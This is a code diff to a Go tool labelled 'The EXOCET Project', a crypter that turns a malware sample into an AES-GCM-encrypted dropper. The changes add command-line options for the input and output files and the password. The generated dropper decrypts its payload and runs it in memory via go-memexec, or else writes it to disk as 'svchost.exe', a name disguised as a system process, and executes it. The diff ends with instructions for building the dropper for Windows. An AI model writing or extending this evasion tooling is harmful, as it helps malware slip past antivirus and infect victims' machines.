@@ -90,7 +90,7 @@ func encryptMalware(origMalware []byte, passphrase string) []byte {
 //	}
 //	return dat, err
 //}
-func writePayload(hexEncryptedMalware []byte) {
+func writePayload(hexEncryptedMalware []byte, outputMalware string, encryptionPassword string) {
 	//var templateGoFile []byte
 	templateGoFile := fmt.Sprintf(`
 package main
@@ -103,6 +103,8 @@ import (
 	"io/ioutil"
 	"fmt"
 	"os/exec"
+	"github.com/amenzhinsky/go-memexec"
+
 )
 
 func createHash(key string) string {
@@ -145,34 +147,47 @@ func main() {
 	if err != nil {
 		fmt.Printf("#{err}")
 	}
-	decryptedDat := decrypt([]byte(decodedDat), "password1")
-	ioutil.WriteFile("./DecryptedDustman.exe", decryptedDat, 0777)
-	exec.Command("DecryptedDustman.exe")
-}`, hexEncryptedMalware)
-	ioutil.WriteFile("./DustmanCrypter.go", []byte(templateGoFile), 0777)
+	decryptedDat := decrypt([]byte(decodedDat), "%s")
+	// First attempt injecting shellcode into running processes
+	// Then attempt in-memory execution
+	exe, err := memexec.New(decryptedDat)
+	if err != nil {
+		fmt.Printf("#{err]")
+	}
+	defer exe.Close()
+	cmd := exe.Command()
+	cmd.Output()
+	// Then try to write a file on the disk and execute it
+	ioutil.WriteFile("./svchost.exe", decryptedDat, 0777)
+	exec.Command("svchost.exe")
+}`, hexEncryptedMalware, encryptionPassword)
+	ioutil.WriteFile(outputMalware, []byte(templateGoFile), 0777)
 }
 func main() {
-	fmt.Println("Starting the application...")
-	//ciphertext := encrypt([]byte("Hello World"), "password")
-	//fmt.Printf("Encrypted: %x\n",ciphertext)
-	//plaintext := decrypt(ciphertext, "password")
-	//fmt.Printf("Decrypted: %s\n", plaintext)
-	// Add a reader IO as bytes function here
-	//dat, err := readMalware("Dustman.exe")
-	dat, err := ioutil.ReadFile("Dustman.exe")
+	//fmt.Println("Starting the")
+	fmt.Printf(`
+The EXOCET Project. Part of the Slayer-Ranger's DSX Weapons Program.
+`)
+	args := os.Args
+	if len(os.Args) < 4 {
+		fmt.Printf("How to use:\r\n\tgo run EXOCET.go $PATH/malware outputMalware.go encryptionPassword\n")
+		os.Exit(3)
+	}
+	origMalware := args[1]
+	outputMalware := args[2]
+	encryptionPassword := args[3]
+	fmt.Printf("Original malware sample selected: %s\n",origMalware)
+	fmt.Printf("Output malware sample selected: %s\n",outputMalware)
+	fmt.Printf("Encryption password for AES Galois/Counter Mode %s\n", encryptionPassword)
+
+	dat, err := ioutil.ReadFile(origMalware)
 	//b64dat := base64.StdEncoding.EncodeToString(dat)
 	if err != nil {
 		fmt.Println(err)
 	}
-	// EncryptFile function (outputFile, data read from malware, passphrase)
-	encryptFile("EncryptedDustman.exe", dat, "password1")
-	decryptedDat := decryptFile("EncryptedDustman.exe", "password1")
-	//fmt.Printf(decryptedDat)
-	// Decrypted malware has same matching hash
-	ioutil.WriteFile("./DecryptedDustman.exe", decryptedDat, 0777)
+
 	// Attempt to create a hex encoded payload in another go file, where that other go file serves as a dropper
-	hexEncryptedMalware := encryptMalware(dat, "password1")
-	// proven it works
-	//fmt.Printf("%x",hexEncryptedMalware)
-	writePayload(hexEncryptedMalware)
+	hexEncryptedMalware := encryptMalware(dat, encryptionPassword)
+	writePayload(hexEncryptedMalware, outputMalware, encryptionPassword)
+	fmt.Printf("The malware Go file has been completed. To cross compile the malware dropper for Windows for example, run:\r\n\tenv GOARCH=amd64 GOOS=windows go build %s\n\nThat will return to you a executable\n", outputMalware)
 }
